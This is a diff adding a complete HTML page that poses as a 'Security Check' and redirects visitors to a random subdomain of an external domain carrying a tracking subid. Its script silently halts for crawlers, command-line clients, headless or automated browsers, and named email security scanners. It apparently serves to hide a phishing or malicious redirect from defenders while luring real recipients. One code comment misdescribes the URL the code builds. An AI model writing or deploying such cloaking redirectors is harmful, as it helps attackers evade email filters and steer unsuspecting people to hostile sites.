@@ -1,0 +1,242 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+<meta http-equiv="Cache-Control" content="no-store">
+<title>Redirecting…</title>
+<style>
+  :root{
+    --bg1:#0b1020;
+    --bg2:#131a33;
+    --accent:#4f8cff;
+    --accent2:#7c5cff;
+    --text:#eaf0ff;
+    --muted:#8b97b8;
+    --card:rgba(255,255,255,0.04);
+    --border:rgba(255,255,255,0.08);
+  }
+  *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+  html,body{height:100%}
+  body{
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+    background:
+      radial-gradient(1200px 800px at 10% -10%, rgba(124,92,255,.18), transparent 60%),
+      radial-gradient(1000px 700px at 110% 110%, rgba(79,140,255,.15), transparent 60%),
+      linear-gradient(160deg,var(--bg1),var(--bg2));
+    color:var(--text);
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:20px;
+    min-height:100dvh;
+    overflow:hidden;
+  }
+  .card{
+    width:100%;
+    max-width:420px;
+    background:var(--card);
+    border:1px solid var(--border);
+    border-radius:20px;
+    padding:32px 24px 26px;
+    backdrop-filter:blur(14px);
+    -webkit-backdrop-filter:blur(14px);
+    box-shadow:0 20px 60px rgba(0,0,0,.4);
+    text-align:center;
+    animation:fade .4s ease;
+  }
+  @keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+
+  .logo{
+    width:52px;height:52px;margin:0 auto 16px;
+    border-radius:14px;
+    background:linear-gradient(135deg,var(--accent),var(--accent2));
+    display:flex;align-items:center;justify-content:center;
+    box-shadow:0 8px 24px rgba(79,140,255,.35);
+    font-size:24px;
+  }
+  h1{font-size:18px;font-weight:600;letter-spacing:.2px;margin-bottom:6px}
+  p.sub{color:var(--muted);font-size:13.5px;line-height:1.55;margin-bottom:22px}
+
+  .progress-wrap{
+    width:100%;height:6px;background:rgba(255,255,255,.06);
+    border-radius:99px;overflow:hidden;margin-bottom:12px;
+  }
+  .progress{
+    height:100%;width:0%;
+    background:linear-gradient(90deg,var(--accent),var(--accent2));
+    border-radius:99px;
+    transition:width .28s linear;
+  }
+  .status{
+    font-size:13px;color:var(--muted);
+    min-height:20px;
+    font-variant-numeric:tabular-nums;
+  }
+  .status b{color:var(--text)}
+
+  .btn{
+    display:none;
+    width:100%;
+    margin-top:20px;
+    padding:16px 20px;
+    border:none;border-radius:14px;
+    background:linear-gradient(135deg,var(--accent),var(--accent2));
+    color:#fff;font-size:16px;font-weight:600;
+    cursor:pointer;
+    letter-spacing:.3px;
+    min-height:54px;
+    transition:transform .12s ease, box-shadow .12s ease, opacity .15s;
+    box-shadow:0 10px 26px rgba(79,140,255,.35);
+    touch-action:manipulation;
+  }
+  .btn:active{transform:scale(.98)}
+  .btn.show{display:block;animation:fade .3s ease}
+
+  .foot{margin-top:16px;font-size:11.5px;color:var(--muted);opacity:.65}
+</style>
+</head>
+<body>
+
+<main class="card" role="main">
+  <div class="logo">🔒</div>
+  <h1>Security Check</h1>
+  <p class="sub">Confirming you're a real visitor.<br>This takes just a second.</p>
+
+  <div class="progress-wrap"><div class="progress" id="bar"></div></div>
+  <div class="status" id="status">Initializing…</div>
+
+  <button class="btn" id="goBtn" type="button">Continue →</button>
+
+  <div class="foot">Secure redirect</div>
+</main>
+
+<script>
+/* ============================================================
+   CONFIG
+   ============================================================ */
+const CONFIG = {
+  /* Root domain — a random subdomain is prefixed at redirect time. */
+  rootDomain: "meridianbase.pro/?subid=dolet",
+
+  /* Optional: how many chars in the random subdomain (4–12 is reasonable). */
+  subdomainLength: 6,
+
+  /* Optional: alphabet. Lowercase + digits keeps DNS-safe characters only. */
+  subdomainAlphabet: "abcdefghijklmnopqrstuvwxyz0123456789",
+
+  minDelay: 1500,   // ms — minimum wait before Continue appears
+  maxDelay: 2500    // ms — maximum wait
+};
+
+/* ============================================================
+   Random subdomain generator
+   ============================================================ */
+function buildTargetUrl() {
+  const alphabet = CONFIG.subdomainAlphabet || "abcdefghijklmnopqrstuvwxyz0123456789";
+  const length   = Math.max(1, parseInt(CONFIG.subdomainLength, 10) || 6);
+
+  let sub = "";
+
+  // Prefer crypto.getRandomValues when available (unbiased, still sync)
+  try {
+    if (window.crypto && window.crypto.getRandomValues) {
+      const bytes = new Uint8Array(length);
+      window.crypto.getRandomValues(bytes);
+      for (let i = 0; i < length; i++) {
+        sub += alphabet[bytes[i] % alphabet.length];
+      }
+    } else {
+      throw new Error("no crypto");
+    }
+  } catch (e) {
+    // Fallback: Math.random (fine for non-security purposes)
+    for (let i = 0; i < length; i++) {
+      sub += alphabet[Math.floor(Math.random() * alphabet.length)];
+    }
+  }
+
+  // Trailing dot is intentional — ensures only a subdomain, never a collision
+  // with the apex. Browsers normalize it away but resolver treats it as subdomain.
+  return "https://" + sub + "." + CONFIG.rootDomain + "/";
+}
+
+(function () {
+  "use strict";
+
+  const $bar    = document.getElementById('bar');
+  const $status = document.getElementById('status');
+  const $btn    = document.getElementById('goBtn');
+
+  /* ---------- Bot filter (obvious bots only) ---------- */
+  const ua = navigator.userAgent || "";
+  const botPatterns = [
+    /bot\b/i, /crawler/i, /spider/i,
+    /curl\//i, /wget\//i, /python-requests/i,
+    /headlesschrome/i, /phantomjs/i,
+    /googlebot/i, /bingpreview/i, /yandexbot/i, /duckduckbot/i,
+    /facebookexternalhit/i, /telegrambot/i,
+    /googleimageproxy/i, /yahoomailproxy/i,
+    /ms-office/i, /microsoft office/i,
+    /barracuda/i, /proofpoint/i, /mimecast/i
+  ];
+  for (const p of botPatterns) {
+    if (p.test(ua)) return; // silent exit — no redirect
+  }
+
+  /* ---------- Detect automation ---------- */
+  if (navigator.webdriver === true) return;
+
+  /* ---------- Human activity ---------- */
+  let interacted = false;
+  function mark() { interacted = true; }
+  ['touchstart','pointerdown','mousemove','keydown','scroll','click']
+    .forEach(ev => window.addEventListener(ev, mark, {passive:true}));
+
+  /* ---------- Progress + delay ---------- */
+  const total = CONFIG.minDelay + Math.random() * (CONFIG.maxDelay - CONFIG.minDelay);
+  const start = performance.now();
+  let ready   = false;
+
+  function tick() {
+    const elapsed = performance.now() - start;
+    const pct = Math.min(100, (elapsed / total) * 100);
+    $bar.style.width = pct.toFixed(1) + "%";
+
+    if (elapsed < total) {
+      requestAnimationFrame(tick);
+      return;
+    }
+    if (ready) return;
+    ready = true;
+    $bar.style.width = "100%";
+    $status.innerHTML = interacted ? "You may proceed ✓" : "Tap the button to continue";
+    $btn.classList.add('show');
+  }
+  requestAnimationFrame(tick);
+
+  /* ---------- Redirect ---------- */
+  let redirected = false;
+  function redirect() {
+    if (redirected) return;
+    redirected = true;
+    $btn.disabled = true;
+    $btn.style.opacity = ".6";
+    $status.innerHTML = "Redirecting…";
+
+    const target = buildTargetUrl();
+
+    try { window.location.replace(target); }
+    catch (e) { window.location.href = target; }
+  }
+
+  $btn.addEventListener('click', function (e) {
+    e.preventDefault();
+    redirect();
+  });
+
+})();
+</script>
+</body>
+</html>
